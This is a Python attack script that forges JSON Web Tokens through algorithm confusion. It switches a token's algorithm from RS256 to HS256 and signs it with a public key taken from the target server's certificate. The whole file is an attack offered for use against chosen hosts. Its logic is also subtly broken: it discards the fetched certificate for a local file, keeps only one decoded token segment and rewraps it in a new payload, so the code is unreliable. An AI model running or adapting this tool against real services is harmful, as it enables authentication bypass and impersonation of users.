import ssl
from cryptography.x509 import load_pem_x509_certificate
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import base64
import jwt
import argparse

def jwtSigner(jwt_token, host, port):
    cert = ssl.get_server_certificate((host, port))
    print("Server certificate: \n" +cert)
    cert = open("cert", 'r').read()
    cert_obj = load_pem_x509_certificate(cert.encode(), default_backend())
    public_key = cert_obj.public_key()

    with open("rsapub.pem", "wb") as f:
        f.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    )

    public_key = open("rsapub.pem", 'r').read()

    for i in jwt_token.split("."):
        jwt_token = base64.b64decode(i + '=' * (-len(i) % 4))

    jwt_token = jwt_token.decode('UTF-8')
    jwt_token = str(jwt_token).replace("RS256", "HS256")
    jwt_token = jwt.encode({'data': jwt_token}, key=public_key, algorithm="HS256")

    print(jwt_token.decode("utf-8"))

parser = argparse.ArgumentParser(description="Change token algorith from rs256 to hs256 and sign with target public key")
parser.add_argument('--token', dest='token', help="with no .sign")
parser.add_argument('--host', dest='host', help="example google.com")
parser.add_argument('--port', dest='port', help="")
args = parser.parse_args()
token = args.token
host = args.host
port = args.port

jwtSigner(token, host, port)
